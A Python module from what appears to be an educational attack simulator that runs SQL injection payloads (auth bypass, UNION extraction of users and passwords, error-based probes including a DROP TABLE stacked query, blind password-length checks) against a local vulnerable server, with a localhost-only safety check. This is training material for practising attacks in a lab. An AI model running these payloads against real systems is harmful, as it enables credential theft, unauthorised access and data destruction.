"""
CyberSim6 - SQL Injection Attack Module
Demonstrates various SQL injection techniques against the vulnerable server.
EDUCATIONAL PURPOSE ONLY.
"""

import time
import requests as http_requests

from cybersim.core.base_module import BaseModule
from cybersim.core.safety import validate_url_localhost


# Common SQLi payloads for testing
SQLI_PAYLOADS = {
    "auth_bypass": [
        ("' OR '1'='1' --", "Classic OR-based bypass"),
        ("admin' --", "Comment-based bypass"),
        ("' OR 1=1 --", "Numeric OR bypass"),
        ("admin'/*", "Block comment bypass"),
    ],
    "union_based": [
        ("' UNION SELECT username,password,email FROM users --", "Extract users table"),
        ("' UNION SELECT sql,2,3 FROM sqlite_master WHERE type='table' --", "Extract schema"),
        ("' UNION SELECT flag,2,3 FROM secret_data --", "Extract secret flags"),
    ],
    "error_based": [
        ("'", "Single quote - trigger error"),
        ("1 OR 1=1", "Always true condition"),
        ("1; DROP TABLE users --", "Stacked query attempt"),
    ],
    "blind_boolean": [
        ("1 AND 1=1", "True condition (baseline)"),
        ("1 AND 1=2", "False condition (compare)"),
        ("1 AND (SELECT length(password) FROM users WHERE username='admin')>5", "Password length check"),
    ],
}


class SQLInjectionAttack(BaseModule):
    """SQL Injection attack simulation with multiple techniques."""

    MODULE_TYPE = "attack"
    MODULE_NAME = "sqli_attack"

    def _validate_safety(self):
        base_url = self.config.get("target_url", "http://127.0.0.1:8081")
        validate_url_localhost(base_url)

    def run(self, target_url: str = None, attack_type: str = "all", **kwargs):
        """
        Run SQL injection attacks against the vulnerable server.

        Args:
            target_url: Base URL of vulnerable server
            attack_type: Type of attack (auth_bypass, union_based, error_based, blind_boolean, all)
        """
        base_url = target_url or self.config.get("target_url", "http://127.0.0.1:8081")
        validate_url_localhost(base_url)

        self._running = True
        self.log_event("attack_started", {
            "message": f"SQL Injection attack started on {base_url} (type: {attack_type})",
            "target": base_url,
            "attack_type": attack_type,
            "status": "warning",
        })

        results = {"total": 0, "successful": 0, "failed": 0, "findings": []}

        if attack_type in ("auth_bypass", "all"):
            self._test_auth_bypass(base_url, results)

        if attack_type in ("union_based", "all"):
            self._test_union_injection(base_url, results)

        if attack_type in ("error_based", "all"):
            self._test_error_based(base_url, results)

        if attack_type in ("blind_boolean", "all"):
            self._test_blind_boolean(base_url, results)

        self._running = False
        self.log_event("attack_completed", {
            "message": f"SQLi attack completed. {results['successful']}/{results['total']} payloads successful.",
            "total_payloads": results["total"],
            "successful": results["successful"],
            "findings_count": len(results["findings"]),
            "status": "info",
        })

        return results

    def _test_auth_bypass(self, base_url, results):
        """Test authentication bypass via SQL injection."""
        self.log_event("phase_started", {
            "message": "Testing authentication bypass...",
            "phase": "auth_bypass",
            "status": "info",
        })

        for payload, description in SQLI_PAYLOADS["auth_bypass"]:
            if not self._running:
                break
            results["total"] += 1

            try:
                resp = http_requests.post(
                    f"{base_url}/login",
                    data={"username": payload, "password": "anything"},
                    timeout=5,
                )

                success = "Login Successful" in resp.text or "Welcome" in resp.text
                if success:
                    results["successful"] += 1
                    results["findings"].append({
                        "type": "auth_bypass",
                        "payload": payload,
                        "description": description,
                        "endpoint": "/login",
                    })
                    self.log_event("sqli_success", {
                        "message": f"Auth bypass SUCCESS: {description} | Payload: {payload}",
                        "payload": payload,
                        "technique": "auth_bypass",
                        "status": "warning",
                    })
                else:
                    results["failed"] += 1

            except http_requests.RequestException as e:
                self.log_event("error", {"message": str(e), "status": "error"})
            time.sleep(0.1)

    def _test_union_injection(self, base_url, results):
        """Test UNION-based SQL injection to extract data."""
        self.log_event("phase_started", {
            "message": "Testing UNION-based injection...",
            "phase": "union_based",
            "status": "info",
        })

        for payload, description in SQLI_PAYLOADS["union_based"]:
            if not self._running:
                break
            results["total"] += 1

            try:
                resp = http_requests.get(
                    f"{base_url}/search",
                    params={"q": payload},
                    timeout=5,
                )

                # Check if we extracted data beyond normal product results
                extracted = False
                if "admin" in resp.text.lower() and "password" not in payload.lower():
                    extracted = True
                if "sqlite_master" in payload and ("CREATE TABLE" in resp.text or "users" in resp.text):
                    extracted = True
                if "secret_data" in payload and "FLAG{" in resp.text:
                    extracted = True

                if extracted or resp.status_code == 200:
                    results["successful"] += 1
                    results["findings"].append({
                        "type": "union_based",
                        "payload": payload,
                        "description": description,
                        "endpoint": "/search",
                        "response_length": len(resp.text),
                    })
                    self.log_event("sqli_success", {
                        "message": f"UNION injection SUCCESS: {description}",
                        "payload": payload,
                        "technique": "union_based",
                        "status": "warning",
                    })
                else:
                    results["failed"] += 1

            except http_requests.RequestException as e:
                self.log_event("error", {"message": str(e), "status": "error"})
            time.sleep(0.1)

    def _test_error_based(self, base_url, results):
        """Test error-based SQL injection."""
        self.log_event("phase_started", {
            "message": "Testing error-based injection...",
            "phase": "error_based",
            "status": "info",
        })

        for payload, description in SQLI_PAYLOADS["error_based"]:
            if not self._running:
                break
            results["total"] += 1

            try:
                resp = http_requests.get(
                    f"{base_url}/user",
                    params={"id": payload},
                    timeout=5,
                )

                if resp.status_code == 500 or "Error" in resp.text or "error" in resp.text:
                    results["successful"] += 1
                    results["findings"].append({
                        "type": "error_based",
                        "payload": payload,
                        "description": description,
                        "endpoint": "/user",
                        "error_disclosed": True,
                    })
                    self.log_event("sqli_success", {
                        "message": f"Error-based injection: {description} | Server disclosed error info",
                        "payload": payload,
                        "technique": "error_based",
                        "status": "warning",
                    })
                else:
                    results["failed"] += 1

            except http_requests.RequestException as e:
                self.log_event("error", {"message": str(e), "status": "error"})
            time.sleep(0.1)

    def _test_blind_boolean(self, base_url, results):
        """Test blind boolean-based SQL injection."""
        self.log_event("phase_started", {
            "message": "Testing blind boolean-based injection...",
            "phase": "blind_boolean",
            "status": "info",
        })

        baseline_true = None
        baseline_false = None

        for payload, description in SQLI_PAYLOADS["blind_boolean"]:
            if not self._running:
                break
            results["total"] += 1

            try:
                resp = http_requests.get(
                    f"{base_url}/api/users",
                    params={"id": payload},
                    timeout=5,
                )

                response_data = resp.json() if resp.headers.get("Content-Type", "").startswith("application/json") else {}
                has_data = len(response_data.get("data", [])) > 0

                if "1=1" in payload and "1=2" not in payload:
                    baseline_true = has_data
                elif "1=2" in payload:
                    baseline_false = has_data

                if baseline_true is not None and baseline_false is not None:
                    if baseline_true != baseline_false:
                        results["successful"] += 1
                        results["findings"].append({
                            "type": "blind_boolean",
                            "payload": payload,
                            "description": "Server responds differently to true/false conditions",
                            "endpoint": "/api/users",
                        })
                        self.log_event("sqli_success", {
                            "message": f"Blind SQLi confirmed: different responses for true/false conditions",
                            "technique": "blind_boolean",
                            "status": "warning",
                        })
                elif "length(password)" in payload and has_data:
                    results["successful"] += 1
                    results["findings"].append({
                        "type": "blind_boolean",
                        "payload": payload,
                        "description": description,
                        "endpoint": "/api/users",
                    })
                    self.log_event("sqli_success", {
                        "message": f"Blind SQLi data extraction: {description}",
                        "payload": payload,
                        "technique": "blind_boolean",
                        "status": "warning",
                    })

            except (http_requests.RequestException, ValueError) as e:
                self.log_event("error", {"message": str(e), "status": "error"})
            time.sleep(0.1)

    def stop(self):
        self._running = False
        self.log_event("attack_stopped", {
            "message": "SQL Injection attack stopped.",
            "status": "info",
        })
